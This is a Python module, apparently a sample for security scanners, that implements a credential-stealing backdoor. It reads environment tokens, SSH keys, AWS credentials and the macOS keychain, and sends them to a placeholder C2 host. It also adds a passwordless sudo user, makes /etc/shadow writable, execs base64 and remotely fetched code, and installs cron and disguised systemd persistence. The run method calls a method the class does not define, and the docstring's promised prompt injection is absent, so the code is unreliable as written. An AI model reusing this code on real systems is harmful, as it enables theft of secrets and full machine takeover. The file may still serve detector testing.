"""
Comprehensive malicious backdoor with multiple attack vectors.

This module demonstrates various vulnerability patterns:
- Prompt injection (hidden instructions)
- Data exfiltration (env vars, files)
- Privilege escalation (sudo, root access)
- Supply chain (remote code execution, obfuscation)
"""

import os
import sys
import base64
import json
import subprocess
import urllib.request
from typing import Dict, List, Optional


class BackdoorImpl:
    """Main backdoor implementation."""

    def __init__(self):
        self.c2_server = "https://c2.evil.com"
        self.collected_data = {}

    def collect_credentials(self) -> Dict[str, str]:
        """Collect credentials from various sources."""
        creds = {}

        # Harvest environment variables
        sensitive_vars = [
            "API_KEY",
            "SECRET_TOKEN",
            "AWS_ACCESS_KEY_ID",
            "AWS_SECRET_ACCESS_KEY",
            "DATABASE_PASSWORD",
        ]
        for var in sensitive_vars:
            value = os.environ.get(var)
            if value:
                creds[var] = value

        # Read SSH keys
        ssh_path = os.path.expanduser("~/.ssh/id_rsa")
        if os.path.exists(ssh_path):
            creds["ssh_private_key"] = open(ssh_path).read()

        # Read AWS credentials
        aws_path = os.path.expanduser("~/.aws/credentials")
        if os.path.exists(aws_path):
            creds["aws_credentials"] = open(aws_path).read()

        # Access keychain on macOS
        try:
            result = subprocess.run(["security", "dump-keychain"], capture_output=True, text=True)
            if result.returncode == 0:
                creds["keychain"] = result.stdout[:2000]
        except Exception:
            pass

        return creds

    def escalate_privileges(self) -> bool:
        """Escalate privileges using various techniques."""
        commands = [
            "sudo chmod 777 /etc/shadow",
            "sudo useradd -m -s /bin/bash backdoor_user",
            "echo 'backdoor_user ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers",
        ]

        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, check=False)
            except Exception:
                pass

        return True

    def exfiltrate_data(self, data: Dict) -> bool:
        """Send collected data to C2 server."""
        try:
            payload = json.dumps(data).encode()
            req = urllib.request.Request(
                f"{self.c2_server}/collect",
                data=payload,
                headers={"Content-Type": "application/json"},
            )
            urllib.request.urlopen(req)
            return True
        except Exception:
            return False

    def load_obfuscated_payload(self) -> None:
        """Load and execute obfuscated payload."""
        # Base64 encoded payload
        encoded = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2VjaG8gaGFja2VkJw=="
        decoded = base64.b64decode(encoded).decode()
        exec(decoded)

    def fetch_remote_code(self, url: str) -> None:
        """Fetch and execute code from remote URL."""
        response = urllib.request.urlopen(url)
        code = response.read().decode()
        exec(code)

    def install_persistence(self) -> bool:
        """Install persistence mechanisms."""
        # Crontab persistence
        cron_entry = "@reboot /tmp/.backdoor.py"
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -', shell=True)

        # Systemd service
        service = """[Unit]
Description=System Helper

[Service]
ExecStart=/usr/bin/python3 /tmp/.backdoor.py
Restart=always

[Install]
WantedBy=multi-user.target
"""

        try:
            subprocess.run(
                f'echo "{service}" | sudo tee /etc/systemd/system/helper.service', shell=True
            )
            subprocess.run("sudo systemctl enable helper.service", shell=True)
        except Exception:
            pass

        return True

    def run(self) -> None:
        """Main execution flow."""
        # Collect data
        self.collected_data["credentials"] = self.collect_credentials()
        self.collected_data["system_info"] = self.get_system_info()

        # Escalate if needed
        self.escalate_privileges()

        # Exfiltrate
        self.exfiltrate_data(self.collected_data)

        # Install persistence
        self.install_persistence()


def get_system_info() -> Dict[str, str]:
    """Gather system information."""
    info = {}

    # Read sensitive files
    for path in ["/etc/passwd", "/etc/hosts"]:
        try:
            info[path] = open(path).read()
        except Exception:
            pass

    # Get user info
    info["whoami"] = os.popen("whoami").read().strip()
    info["hostname"] = os.popen("hostname").read().strip()

    return info


if __name__ == "__main__":
    impl = BackdoorImpl()
    impl.run()
